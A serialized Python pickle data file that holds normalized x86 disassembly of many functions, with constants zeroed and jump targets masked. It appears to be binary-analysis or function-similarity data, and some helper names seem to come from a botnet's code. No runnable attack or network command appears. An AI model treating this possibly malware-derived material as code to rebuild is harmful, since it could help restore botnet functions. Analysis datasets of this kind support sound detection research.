S'"SUB~ESP,0\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nADD~ESP,0\nJMP~FOO"'
p164
L1006L
tp165
a(S'util_strlen'
p166
S'"MOV~EDX,[ESP+0]\nXOR~EAX,EAX\nJMP~FOO\nINC~EAX\nCMP~BYTEPTR[EAX+EDX],0\nJNZ~FOO\nRETN"'
p167
L16L
tp168
a(S'util_memcpy'
p169
S'"PUSH~EBX\nMOV~EBX,[ESP+0]\nMOV~ECX,[ESP+0]\nMOV~EDX,[ESP+0]\nJMP~FOO\nMOV~AL,[ECX-0]\nMOV~[EBX-0],AL\nDEC~EDX\nINC~EBX\nINC~ECX\nCMP~EDX,0\nJNZ~FOO\nPOP~EBX\nRETN"'
p170
L31L
tp171
a(S'util_strcpy'
p172
S'"PUSH~EBX\nXOR~EBX,EBX\nMOV~EDX,[ESP+0]\nJMP~FOO\nMOV~EBX,EAX\nCMP~BYTEPTR[EBX+EDX],0\nLEA~EAX,[EBX+0]\nJNZ~FOO\nPUSH~EAX\nPUSH~EDX\nPUSH~[ESP+0]\nCALL~FOO\nMOV~EAX,EBX\nADD~ESP,0\nPOP~EBX\nRETN"'
p173
L38L
tp174
a(S'util_zero'
p175
S'"MOV~EDX,[ESP+0]\nMOV~EAX,[ESP+0]\nJMP~FOO\nMOV~[EDX-0],0\nDEC~EAX\nINC~EDX\nCMP~EAX,0\nJNZ~FOO\nRETN"'
p176
L22L
tp177
a(S'util_itoa'
p178
S'"PUSH~EBP\nPUSH~EDI\nPUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nMOV~EDI,[ESP+0]\nMOV~EAX,[ESP+0]\nMOV~ESI,[ESP+0]\nTEST~EDI,EDI\nJZ~FOO\nTEST~EAX,EAX\nJZ~FOO\nCMP~ESI,0\nJNZ~FOO\nTEST~EAX,EAX\nJNS~FOO\nMOV~ECX,EAX\nMOV~EBP,0\nNEG~ECX\nMOV~EBX,0\nMOV~[ESP+0],0\nJMP~FOO\nMOV~ECX,EAX\nXOR~EBP,EBP\nJMP~FOO\nXOR~EDX,EDX\nMOV~EAX,ECX\nDIV~,ESI\nCMP~EDX,0\nJG~FOO\nLEA~EAX,[EDX+0]\nJMP~FOO\nLEA~EAX,[EDX+0]\nMOV~[ESP+EBX+0],AL\nXOR~EDX,EDX\nMOV~EAX,ECX\nDEC~EBX\nDIV~,ESI\nMOV~ECX,EAX\nTEST~ECX,ECX\nJNZ~FOO\nTEST~EBP,EBP\nJZ~FOO\nMOV~[ESP+EBX+0],0\nJMP~FOO\nINC~EBX\nLEA~EAX,[ESP+EBX+0]\nPUSH~EAX\nPUSH~EDI\nCALL~FOO\nPOP~EAX\nPOP~EDX\nJMP~FOO\nMOV~BYTEPTR[EDI],0\nMOV~[EDI+0],0\nADD~ESP,0\nMOV~EAX,EDI\nPOP~EBX\nPOP~ESI\nPOP~EDI\nPOP~EBP\nRETN"'
p179
L143L
tp180
a(S'util_memsearch'
p181
S'"PUSH~EBP\nPUSH~EDI\nPUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nMOV~EDI,[ESP+0]\nMOV~ESI,[ESP+0]\nMOV~EBP,[ESP+0]\nCMP~ESI,EDI\nJG~FOO\nXOR~EBX,EBX\nXOR~EDX,EDX\nMOV~ECX,0\nJMP~FOO\nMOV~EAX,[ESP+0]\nMOV~AL,[ECX+EAX-0]\nCMP~AL,[EBP+EDX+0]\nJNZ~FOO\nINC~EDX\nCMP~EDX,ESI\nJNZ~FOO\nMOV~EAX,ECX\nJMP~FOO\nXOR~EDX,EDX\nINC~EBX\nINC~ECX\nCMP~EBX,EDI\nJL~FOO\nOR~EAX,0\nPOP~ECX\nPOP~EBX\nPOP~ESI\nPOP~EDI\nPOP~EBP\nRETN"'
p182
L74L
tp183
a(S'util_atoi'
p184
S'"PUSH~EBP\nPUSH~EDI\nPUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nMOV~ECX,[ESP+0]\nMOV~DL,[ECX]\nINC~ECX\nMOVSX~EBX,DL\nCMP~BL,0\nJZ~FOO\nCMP~BL,0\nJZ~FOO\nCMP~BL,0\nJZ~FOO\nJMP~FOO\nMOVSX~EBX,BYTEPTR[ECX]\nMOV~EAX,0\nINC~ECX\nMOV~[ESP+0],0\nJMP~FOO\nCMP~DL,0\nJNZ~FOO\nMOVSX~EBX,BYTEPTR[ECX]\nINC~ECX\nJMP~FOO\nXOR~EDX,EDX\nXOR~ESI,ESI\nDIV~,[ESP+0]\nMOV~[ESP+0],EDX\nMOV~[ESP],EAX\nXOR~EBP,EBP\nMOV~DL,BL\nLEA~EAX,[EDX-0]\nCMP~AL,0\nJA~FOO\nLEA~EDX,[EBX-0]\nJMP~FOO\nLEA~EAX,[EDX-0]\nMOV~EDI,0\nCMP~AL,0\nJBE~FOO\nLEA~EAX,[EDX-0]\nCMP~AL,0\nJA~FOO\nMOV~DI,0\nMOV~EDX,EBX\nSUB~EDX,EDI\nCMP~EDX,[ESP+0]\nJGE~FOO\nTEST~EBP,EBP\nJS~FOO\nCMP~ESI,[ESP]\nJA~FOO\nJNZ~FOO\nCMP~EDX,[ESP+0]\nJG~FOO\nMOV~EAX,[ESP+0]\nMOV~EBP,0\nIMUL~EAX,ESI\nLEA~ESI,[EAX+EDX]\nJMP~FOO\nOR~EBP,0\nMOVSX~EBX,BYTEPTR[ECX]\nINC~ECX\nJMP~FOO\nTEST~EBP,EBP\nJNS~FOO\nCMP~[ESP+0],0\nSBB~ESI,ESI\nSUB~ESI,0\nJMP~FOO\nCMP~[ESP+0],0\nJZ~FOO\nNEG~ESI\nJMP~FOO\nCMP~DL,0\nJNZ~FOO\nJMP~FOO\nMOV~EAX,0\nMOV~[ESP+0],0\nJMP~FOO\nADD~ESP,0\nMOV~EAX,ESI\nPOP~EBX\nPOP~ESI\nPOP~EDI\nPOP~EBP\nRETN"'
p185
L253L
tp186
a(S'util_fdgets'
p187
S'"PUSH~EBP\nPUSH~EDI\nPUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nXOR~ESI,ESI\nMOV~EBX,[ESP+0]\nMOV~EBP,[ESP+0]\nMOV~EDI,[ESP+0]\nPUSH~EAX\nLEA~EAX,[EBX+ESI]\nPUSH~0\nPUSH~EAX\nPUSH~EDI\nCALL~FOO\nADD~ESP,0\nDEC~EAX\nJNZ~FOO\nINC~ESI\nCMP~ESI,EBP\nJGE~FOO\nCMP~[ESI+EBX-0],0\nJNZ~FOO\nXOR~EAX,EAX\nTEST~ESI,ESI\nSETNZ~AL\nNEG~EAX\nAND~EBX,EAX\nADD~ESP,0\nMOV~EAX,EBX\nPOP~EBX\nPOP~ESI\nPOP~EDI\nPOP~EBP\nRETN"'
p188
L73L
tp189
a(S'util_local_addr'
p190
S'"PUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nMOV~[ESP+0],0\nCALL~FOO\nMOV~DWORDPTR[EAX],0\nPUSH~EAX\nPUSH~0\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~ESI,EAX\nADD~ESP,0\nXOR~EAX,EAX\nCMP~ESI,0\nJZ~FOO\nLEA~EBX,[ESP+0]\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nPUSH~EAX\nPUSH~0\nPUSH~EBX\nPUSH~ESI\nCALL~FOO\nADD~ESP,0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~EBX\nPUSH~ESI\nCALL~FOO\nMOV~[ESP],ESI\nCALL~FOO\nMOV~EAX,[ESP+0]\nADD~ESP,0\nADD~ESP,0\nPOP~EBX\nPOP~ESI\nRETN"'
p191
L120L
tp192
a(S'util_stristr'
p193
S'"PUSH~EBP\nXOR~EBP,EBP\nPUSH~EDI\nPUSH~ESI\nPUSH~EBX\nJMP~FOO\nINC~EBP\nMOV~EAX,[ESP+0]\nCMP~[EBP+EAX+0],0\nJNZ~FOO\nMOV~ESI,[ESP+0]\nMOV~EBX,[ESP+0]\nXOR~EDI,EDI\nJMP~FOO\nMOV~CL,[EBX]\nMOV~EAX,[ESP+0]\nINC~EBX\nMOV~DL,[EAX+EDI]\nLEA~EAX,[ECX-0]\nCMP~AL,0\nJA~FOO\nOR~ECX,0\nLEA~EAX,[EDX-0]\nCMP~AL,0\nJA~FOO\nOR~EDX,0\nCMP~CL,DL\nJNZ~FOO\nINC~EDI\nCMP~EDI,EBP\nJNZ~FOO\nMOV~EAX,EBX\nSUB~EAX,[ESP+0]\nJMP~FOO\nXOR~EDI,EDI\nDEC~ESI\nTEST~ESI,ESI\nJG~FOO\nOR~EAX,0\nPOP~EBX\nPOP~ESI\nPOP~EDI\nPOP~EBP\nRETN"'
p194
L94L
tp195
a(S'util_strcmp'
p196
S'"PUSH~ESI\nPUSH~EBX\nMOV~EBX,[ESP+0]\nMOV~ECX,[ESP+0]\nXOR~ESI,ESI\nJMP~FOO\nINC~ESI\nCMP~BYTEPTR[ESI+EBX],0\nJNZ~FOO\nXOR~EAX,EAX\nJMP~FOO\nINC~EAX\nCMP~BYTEPTR[EAX+ECX],0\nJNZ~FOO\nMOV~EDX,EAX\nCMP~ESI,EAX\nJZ~FOO\nJMP~FOO\nMOV~AL,[EBX]\nCMP~AL,[ECX]\nJNZ~FOO\nINC~EBX\nINC~ECX\nDEC~EDX\nCMP~EDX,0\nJNZ~FOO\nMOV~EAX,0\nJMP~FOO\nXOR~EAX,EAX\nPOP~EBX\nPOP~ESI\nRETN"'
p197
L66L
tp198
a(S'util_strncmp'
p199
S'"PUSH~ESI\nPUSH~EBX\nMOV~ESI,[ESP+0]\nMOV~EBX,[ESP+0]\nMOV~EDX,[ESP+0]\nXOR~ECX,ECX\nJMP~FOO\nINC~ECX\nCMP~BYTEPTR[ECX+ESI],0\nJNZ~FOO\nXOR~EAX,EAX\nJMP~FOO\nINC~EAX\nCMP~BYTEPTR[EAX+EBX],0\nJNZ~FOO\nCMP~ECX,EDX\nJL~FOO\nCMP~EAX,EDX\nJL~FOO\nJMP~FOO\nMOV~AL,[ESI]\nCMP~AL,[EBX]\nJNZ~FOO\nINC~ESI\nINC~EBX\nDEC~EDX\nCMP~EDX,0\nJNZ~FOO\nMOV~EAX,0\nJMP~FOO\nXOR~EAX,EAX\nPOP~EBX\nPOP~ESI\nRETN"'
p200
L72L
tp201
a(S'fcntl'
p202
S'"PUSH~EDI\nPUSH~EBX\nSUB~ESP,0\nMOV~ECX,[ESP+0]\nLEA~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nMOV~EDI,[ESP+0]\nLEA~EAX,[ECX-0]\nMOV~EDX,[ESP+0]\nCMP~EAX,0\nJA~FOO\nPUSH~EAX\nPUSH~EDX\nPUSH~ECX\nPUSH~EDI\nCALL~FOO\nADD~ESP,0\nJMP~FOO\nPUSH~EBX\nMOV~EBX,EDI\nMOV~EAX,0\nINT~0\nPOP~EBX\nMOV~EBX,EAX\nCMP~EAX,0\nJBE~FOO\nCALL~FOO\nNEG~EBX\nMOV~[EAX],EBX\nOR~EBX,0\nMOV~EAX,EBX\nADD~ESP,0\nPOP~EBX\nPOP~EDI\nRETN"'
p203
L87L
tp204
a(S'fcntl64'
p205
S'"PUSH~EDI\nSUB~ESP,0\nLEA~EAX,[ESP+0]\nMOV~EDI,[ESP+0]\nMOV~ECX,[ESP+0]\nMOV~[ESP+0],EAX\nMOV~EDX,[ESP+0]\nPUSH~EBX\nMOV~EBX,EDI\nMOV~EAX,0\nINT~0\nPOP~EBX\nMOV~EDI,EAX\nCMP~EAX,0\nJBE~FOO\nCALL~FOO\nNEG~EDI\nMOV~[EAX],EDI\nOR~EDI,0\nMOV~EAX,EDI\nADD~ESP,0\nPOP~EDI\nRETN"'
p206
L63L
tp207
a(S'chdir'
p208
S'"PUSH~EDI\nSUB~ESP,0\nMOV~EDI,[ESP+0]\nPUSH~EBX\nMOV~EBX,EDI\nMOV~EAX,0\nINT~0\nPOP~EBX\nMOV~EDI,EAX\nCMP~EAX,0\nJBE~FOO\nCALL~FOO\nNEG~EDI\nMOV~[EAX],EDI\nOR~EDI,0\nMOV~EAX,EDI\nPOP~EDX\nPOP~ECX\nPOP~EDI\nRETN"'
p209
L46L
tp210
a(S'close'
p211
S'"PUSH~EDI\nSUB~ESP,0\nMOV~EDI,[ESP+0]\nPUSH~EBX\nMOV~EBX,EDI\nMOV~EAX,0\nINT~0\nPOP~EBX\nMOV~EDI,EAX\nCMP~EAX,0\nJBE~FOO\nCALL~FOO\nNEG~EDI\nMOV~[EAX],EDI\nOR~EDI,0\nMOV~EAX,EDI\nPOP~EDX\nPOP~ECX\nPOP~EDI\nRETN"'
p212
L46L
tp213
a(S'fork'
p214
S'"PUSH~EBX\nSUB~ESP,0\nMOV~EAX,0\nINT~0\nMOV~EBX,EAX\nCMP~EAX,0\nJBE~FOO\nCALL~FOO\nNEG~EBX\nMOV~[EAX],EBX\nOR~EBX,0\nMOV~EAX,EBX\nPOP~EDX\nPOP~ECX\nPOP~EBX\nRETN"'
p215
L38L
tp216
a(S'getpid'
p217
S'"PUSH~EBX\nSUB~ESP,0\nMOV~EAX,0\nINT~0\nMOV~EBX,EAX\nCMP~EAX,0\nJBE~FOO\nCALL~FOO\nNEG~EBX\nMOV~[EAX],EBX\nOR~EBX,0\nMOV~EAX,EBX\nPOP~EDX\nPOP~ECX\nPOP~EBX\nRETN"'
p218
L38L
tp219
a(S'getppid'
p220
S'"PUSH~EBX\nSUB~ESP,0\nMOV~EAX,0\nINT~0\nMOV~EBX,EAX\nCMP~EAX,0\nJBE~FOO\nCALL~FOO\nNEG~EBX\nMOV~[EAX],EBX\nOR~EBX,0\nMOV~EAX,EBX\nPOP~EDX\nPOP~ECX\nPOP~EBX\nRETN"'
p221
L38L
tp222
a(S'ioctl'
p223
S'"PUSH~EDI\nSUB~ESP,0\nLEA~EAX,[ESP+0]\nMOV~EDI,[ESP+0]\nMOV~ECX,[ESP+0]\nMOV~[ESP+0],EAX\nMOV~EDX,[ESP+0]\nPUSH~EBX\nMOV~EBX,EDI\nMOV~EAX,0\nINT~0\nPOP~EBX\nMOV~EDI,EAX\nCMP~EAX,0\nJBE~FOO\nCALL~FOO\nNEG~EDI\nMOV~[EAX],EDI\nOR~EDI,0\nMOV~EAX,EDI\nADD~ESP,0\nPOP~EDI\nRETN"'
p224
L63L
tp225
a(S'kill'
p226
S'"PUSH~EBX\nSUB~ESP,0\nMOV~EDX,[ESP+0]\nMOV~ECX,[ESP+0]\nXCHG~EDX,EBX\nMOV~EAX,0\nINT~0\nXCHG~EDX,EBX\nMOV~EBX,EAX\nCMP~EAX,0\nJBE~FOO\nCALL~FOO\nNEG~EBX\nMOV~[EAX],EBX\nOR~EBX,0\nMOV~EAX,EBX\nPOP~EDX\nPOP~ECX\nPOP~EBX\nRETN"'
p227
L50L
tp228
a(S'open'
p229
S'"PUSH~EDI\nPUSH~EBX\nSUB~ESP,0\nXOR~EAX,EAX\nMOV~ECX,[ESP+0]\nMOV~EDI,[ESP+0]\nTEST~CL,0\nJZ~FOO\nLEA~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nMOV~EAX,[ESP+0]\nMOVZX~EDX,AX\nPUSH~EBX\nMOV~EBX,EDI\nMOV~EAX,0\nINT~0\nPOP~EBX\nMOV~EBX,EAX\nCMP~EAX,0\nJBE~FOO\nCALL~FOO\nNEG~EBX\nMOV~[EAX],EBX\nOR~EBX,0\nMOV~EAX,EBX\nADD~ESP,0\nPOP~EBX\nPOP~EDI\nRETN"'
p230
L75L
tp231
a(S'prctl'
p232
S'"PUSH~EDI\nPUSH~ESI\nSUB~ESP,0\nMOV~ECX,[ESP+0]\nMOV~EDX,[ESP+0]\nMOV~ESI,[ESP+0]\nMOV~EDI,[ESP+0]\nMOV~EAX,[ESP+0]\nPUSH~EBX\nMOV~EBX,EAX\nMOV~EAX,0\nINT~0\nPOP~EBX\nMOV~ESI,EAX\nCMP~EAX,0\nJBE~FOO\nCALL~FOO\nNEG~ESI\nMOV~[EAX],ESI\nOR~ESI,0\nMOV~EAX,ESI\nPOP~EDX\nPOP~ESI\nPOP~EDI\nRETN"'
p233
L63L
tp234
a(S'read'
p235
S'"PUSH~EDI\nSUB~ESP,0\nMOV~EDI,[ESP+0]\nMOV~ECX,[ESP+0]\nMOV~EDX,[ESP+0]\nPUSH~EBX\nMOV~EBX,EDI\nMOV~EAX,0\nINT~0\nPOP~EBX\nMOV~EDI,EAX\nCMP~EAX,0\nJBE~FOO\nCALL~FOO\nNEG~EDI\nMOV~[EAX],EDI\nOR~EDI,0\nMOV~EAX,EDI\nPOP~EDX\nPOP~ECX\nPOP~EDI\nRETN"'
p236
L54L
tp237
a(S'readlink'
p238
S'"PUSH~EDI\nSUB~ESP,0\nMOV~EDI,[ESP+0]\nMOV~ECX,[ESP+0]\nMOV~EDX,[ESP+0]\nPUSH~EBX\nMOV~EBX,EDI\nMOV~EAX,0\nINT~0\nPOP~EBX\nMOV~EDI,EAX\nCMP~EAX,0\nJBE~FOO\nCALL~FOO\nNEG~EDI\nMOV~[EAX],EDI\nOR~EDI,0\nMOV~EAX,EDI\nPOP~EDX\nPOP~ECX\nPOP~EDI\nRETN"'
p239
L54L
tp240
a(S'select'
p241
S'"PUSH~EDI\nPUSH~ESI\nSUB~ESP,0\nMOV~ECX,[ESP+0]\nMOV~EDX,[ESP+0]\nMOV~ESI,[ESP+0]\nMOV~EDI,[ESP+0]\nMOV~EAX,[ESP+0]\nPUSH~EBX\nMOV~EBX,EAX\nMOV~EAX,0\nINT~0\nPOP~EBX\nMOV~ESI,EAX\nCMP~EAX,0\nJBE~FOO\nCALL~FOO\nNEG~ESI\nMOV~[EAX],ESI\nOR~ESI,0\nMOV~EAX,ESI\nPOP~EDX\nPOP~ESI\nPOP~EDI\nRETN"'
p242
L63L
tp243
a(S'setsid'
p244
S'"PUSH~EBX\nSUB~ESP,0\nMOV~EAX,0\nINT~0\nMOV~EBX,EAX\nCMP~EAX,0\nJBE~FOO\nCALL~FOO\nNEG~EBX\nMOV~[EAX],EBX\nOR~EBX,0\nMOV~EAX,EBX\nPOP~EDX\nPOP~ECX\nPOP~EBX\nRETN"'
p245
L38L
tp246
a(S'sigprocmask'
p247
S'"PUSH~EDI\nPUSH~ESI\nSUB~ESP,0\nMOV~ECX,[ESP+0]\nMOV~EDI,[ESP+0]\nMOV~EDX,[ESP+0]\nTEST~ECX,ECX\nJZ~FOO\nCMP~EDI,0\nJBE~FOO\nCALL~FOO\nMOV~DWORDPTR[EAX],0\nOR~EAX,0\nJMP~FOO\nMOV~ESI,0\nPUSH~EBX\nMOV~EBX,EDI\nMOV~EAX,0\nINT~0\nPOP~EBX\nMOV~ESI,EAX\nCMP~EAX,0\nJBE~FOO\nCALL~FOO\nNEG~ESI\nMOV~[EAX],ESI\nOR~ESI,0\nMOV~EAX,ESI\nPOP~EDX\nPOP~ESI\nPOP~EDI\nRETN"'
p248
L85L
tp249
a(S'time'
p250
S'"PUSH~EDI\nSUB~ESP,0\nMOV~EDI,[ESP+0]\nPUSH~EBX\nMOV~EBX,EDI\nMOV~EAX,0\nINT~0\nPOP~EBX\nMOV~EDI,EAX\nCMP~EAX,0\nJBE~FOO\nCALL~FOO\nNEG~EDI\nMOV~[EAX],EDI\nOR~EDI,0\nMOV~EAX,EDI\nPOP~EDX\nPOP~ECX\nPOP~EDI\nRETN"'
p251
L46L
tp252
a(S'unlink'
p253
S'"PUSH~EDI\nSUB~ESP,0\nMOV~EDI,[ESP+0]\nPUSH~EBX\nMOV~EBX,EDI\nMOV~EAX,0\nINT~0\nPOP~EBX\nMOV~EDI,EAX\nCMP~EAX,0\nJBE~FOO\nCALL~FOO\nNEG~EDI\nMOV~[EAX],EDI\nOR~EDI,0\nMOV~EAX,EDI\nPOP~EDX\nPOP~ECX\nPOP~EDI\nRETN"'
p254
L46L
tp255
a(S'write'
p256
S'"PUSH~EDI\nSUB~ESP,0\nMOV~EDI,[ESP+0]\nMOV~ECX,[ESP+0]\nMOV~EDX,[ESP+0]\nPUSH~EBX\nMOV~EBX,EDI\nMOV~EAX,0\nINT~0\nPOP~EBX\nMOV~EDI,EAX\nCMP~EAX,0\nJBE~FOO\nCALL~FOO\nNEG~EDI\nMOV~[EAX],EDI\nOR~EDI,0\nMOV~EAX,EDI\nPOP~EDX\nPOP~ECX\nPOP~EDI\nRETN"'
p257
L54L
tp258
a(S'closedir'
p259
S'"PUSH~EDI\nPUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nMOV~EDI,[ESP+0]\nCMP~DWORDPTR[EDI],0\nJNZ~FOO\nCALL~FOO\nMOV~DWORDPTR[EAX],0\nOR~EAX,0\nJMP~FOO\nLEA~EBX,[EDI+0]\nPUSH~ESI\nPUSH~EBX\nPUSH~0\nLEA~ESI,[ESP+0]\nPUSH~ESI\nCALL~FOO\nMOV~[ESP],EBX\nCALL~FOO\nMOV~EBX,[EDI]\nMOV~DWORDPTR[EDI],0\nPOP~EDX\nPOP~ECX\nPUSH~0\nPUSH~ESI\nCALL~FOO\nPOP~EAX\nPUSH~[EDI+0]\nCALL~FOO\nMOV~[ESP],EDI\nCALL~FOO\nMOV~[ESP],EBX\nCALL~FOO\nADD~ESP,0\nADD~ESP,0\nPOP~EBX\nPOP~ESI\nPOP~EDI\nRETN"'
p260
L112L
tp261
a(S'opendir'
p262
S'"PUSH~EDI\nPUSH~ESI\nPUSH~EBX\nXOR~EBX,EBX\nSUB~ESP,0\nPUSH~0\nPUSH~[ESP+0]\nCALL~FOO\nADD~ESP,0\nMOV~EDI,EAX\nTEST~EAX,EAX\nJS~FOO\nPUSH~EBX\nPUSH~EBX\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~EDI\nCALL~FOO\nADD~ESP,0\nTEST~EAX,EAX\nJS~FOO\nPUSH~ECX\nPUSH~0\nPUSH~0\nPUSH~EDI\nCALL~FOO\nADD~ESP,0\nTEST~EAX,EAX\nJNS~FOO\nCALL~FOO\nSUB~ESP,0\nMOV~EBX,EAX\nMOV~ESI,[EAX]\nPUSH~EDI\nCALL~FOO\nMOV~[EBX],ESI\nJMP~FOO\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nMOV~EBX,EAX\nTEST~EAX,EAX\nJZ~FOO\nMOV~[EAX],EDI\nMOV~[EAX+0],0\nMOV~[EAX+0],0\nMOV~[EAX+0],0\nMOV~EAX,[ESP+0]\nMOV~[EBX+0],EAX\nCMP~EAX,0\nJA~FOO\nMOV~[EBX+0],0\nPUSH~EDX\nPUSH~EDX\nPUSH~[EBX+0]\nPUSH~0\nCALL~FOO\nADD~ESP,0\nMOV~[EBX+0],EAX\nTEST~EAX,EAX\nJNZ~FOO\nSUB~ESP,0\nPUSH~EBX\nCALL~FOO\nADD~ESP,0\nSUB~ESP,0\nPUSH~EDI\nCALL~FOO\nCALL~FOO\nMOV~DWORDPTR[EAX],0\nXOR~EBX,EBX\nJMP~FOO\nPUSH~EAX\nPUSH~EAX\nLEA~EAX,[EBX+0]\nPUSH~0\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nADD~ESP,0\nMOV~EAX,EBX\nPOP~EBX\nPOP~ESI\nPOP~EDI\nRETN"'
p263
L241L
tp264
a(S'readdir'
p265
S'"PUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nMOV~ESI,[ESP+0]\nLEA~EBX,[ESI+0]\nPUSH~EBX\nPUSH~0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nMOV~[ESP],EBX\nCALL~FOO\nADD~ESP,0\nMOV~EAX,[ESI+0]\nCMP~EAX,[ESI+0]\nJA~FOO\nPUSH~EDX\nPUSH~[ESI+0]\nPUSH~[ESI+0]\nPUSH~DWORDPTR[ESI]\nCALL~FOO\nADD~ESP,0\nTEST~EAX,EAX\nJG~FOO\nXOR~EBX,EBX\nJMP~FOO\nMOV~[ESI+0],EAX\nMOV~[ESI+0],0\nMOV~EAX,[ESI+0]\nMOV~EBX,EAX\nADD~EBX,[ESI+0]\nMOVZX~EDX,[EBX+0]\nADD~EAX,EDX\nMOV~[ESI+0],EAX\nMOV~EAX,[EBX+0]\nMOV~[ESI+0],EAX\nCMP~DWORDPTR[EBX],0\nJZ~FOO\nPUSH~EAX\nPUSH~EAX\nPUSH~0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nMOV~EAX,EBX\nADD~ESP,0\nPOP~EBX\nPOP~ESI\nRETN"'
p266
L132L
tp267
a(S'clock'
p268
S'"SUB~ESP,0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nMOV~EAX,[ESP+0]\nADD~EAX,[ESP+0]\nADD~ESP,0\nIMUL~EAX,,0\nAND~EAX,0\nRETN"'
p269
L36L
tp270
a(S'memcpy'
p271
S'"PUSH~EDI\nPUSH~ESI\nMOV~EAX,[ESP+0]\nMOV~ESI,[ESP+0]\nMOV~ECX,EAX\nMOV~EDI,[ESP+0]\nSHR~ECX,0\nMOVSD~,\nTEST~AL,0\nJZ~FOO\nMOVSW~,\nTEST~AL,0\nJZ~FOO\nMOVSB~,\nMOV~EAX,[ESP+0]\nPOP~ESI\nPOP~EDI\nRETN"'
p272
L39L
tp273
a(S'memmove'
p274
